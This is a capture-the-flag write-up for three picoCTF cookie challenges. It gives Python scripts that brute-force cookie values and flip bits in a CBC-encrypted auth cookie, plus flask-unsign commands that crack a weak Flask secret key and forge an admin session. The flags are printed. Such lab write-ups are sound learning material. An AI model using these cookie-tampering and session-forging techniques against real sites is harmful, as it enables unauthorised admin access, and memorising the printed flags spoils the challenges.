# Cookies

## Cookies

Author:  Madstacks

### Description

Who doesn't love cookies? Try to figure out the best one.  [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)

### Solution

Website takes  in cookie name and checks for 'special' cookie. 

By inspecting `Cookies` from `Web Developer Tools` we can see `name` cookie being set to a number. If number is changed so is the cookie name.

Using script we can cycle through the cookies to find 'special' one.

```py
import requests
import re

URL = "http://mercury.picoctf.net:29649/check"

for i in range(32):
    resp = requests.get(URL, cookies={"name": str(i)}).text
    if "Not very special though" not in resp:
        print(i, re.search(r"<code>(picoCTF.*)</code>", resp).group(1))
        break
    cookie = re.search(r"I love (.*) cookies!", resp).group(1)
    print(f"Trying: {i=}\t{cookie=}{' '*16}", end='\r')
```
::: tip Flag
`picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}`
:::
::: info :information_source:
Special cookie is at index 18
:::

## More Cookies

### Description

I forgot Cookies can Be modified Client-side, so now I decided to encrypt them!  [http://mercury.picoctf.net:34962/](http://mercury.picoctf.net:34962/)

<details>
    <summary>Hint 1</summary>
    [Homomorphic Encryption](https://www.wikiwand.com/en/Homomorphic_encryption)
</details>

<details>
    <summary>Hint 2</summary>
    The search endpoint is only helpful for telling you if you are admin or not, you won't be able to guess the flag name
</details>

### Analysis

Website says: ___Welcome to my cookie search page. Only the admin can use it!___

Description is also written a little funny, `Cookies can Be modifed Client-side` => [CBC Encryption](https://www.wikiwand.com/en/Block_cipher_mode_of_operation). There's a known vulnerability called [The Bit Flipping attack](https://crypto.stackexchange.com/a/66086).

### Solution

To reduce bruteforce count my first approach was to try Byte Flip.

```py
from base64 import b64decode as bd, b64encode as be
import requests
import re

URL = "http://mercury.picoctf.net:34962"

with requests.Session() as session:  # Get Cookie Automatically
    session.get(URL)
    cookie = session.cookies['auth_name']
    cookie = bytearray(bd(bd(cookie)))

for position in range(len(cookie)):
    for bit in range(8):  # Bytes. 1 << n = pow(2, n)
        cookie_modifed = cookie[:]  # Copy Original Cookie
        cookie_modifed[position] ^= 1 << bit  # Flip The Bit With XOR
        cookie_modifed = be(be(cookie_modifed)).decode()  # Encode Cookie To Be Sent
        resp = requests.get(URL, cookies={'auth_name': cookie_modifed}).text  # Guess Cookie
        match = re.search(r"<code>(picoCTF.*)</code>", resp, re.I)  # Search For Flag
        if match:
            print(position, bit, match.group(1))
            exit()
        print(f"Trying: {position=}\t{bit=}{' '*4}", end='\r')  # Progress Bar

# >>> Match: position=9       byte=0  Flag=picoCTF{cO0ki3s_yum_e40d16a9} 
```
::: tip Flag
`picoCTF{cO0ki3s_yum_e40d16a9} `
:::
::: info :information_source:
Match: position=9    byte=0
:::

## Most Cookies

### Description

Alright, enough of using my own encryption. Flask session cookies should be plenty secure!<br> 
[server.py](https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py) <br> [http://mercury.picoctf.net:53700/](http://mercury.picoctf.net:53700/)

### Solution

Vulnaribility is `app.secret_key =  random.choice(cookie_names)`. secret_key prevents users manipulating the cookies in flask application, if it's known then user can change cookies to whatever, so secret_key must be secured.

I first converted the list of cookies into wordlist (text file seperated by newlines), then used ___[flask-unsign](https://pypi.org/project/flask-unsign/)___ to get the secret key and forge new cookie.

```bash
└─$ flask-unsign --wordlist keys --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZKVKig.5y5lf-OZ0gIlDBs6HPE33yZU4Nc --unsign
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
                                                                                                                                       
└─$ flask-unsign --sign --cookie '{"very_auth": "admin"}' --secret "peanut butter"                                
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZKVLZg.Zptg98ybr6N_-o8MkUkj58xVPf8
```

Change the cookie on website, I like to do it from Web Developer Tools.
::: tip Flag
`picoCTF{pwn_4ll_th3_cook1E5_3646b931}`
:::
::: info :information_source:
Encountered similar challenge at [Very Secure](https://xhacka.github.io/posts/Very-Secure/)
:::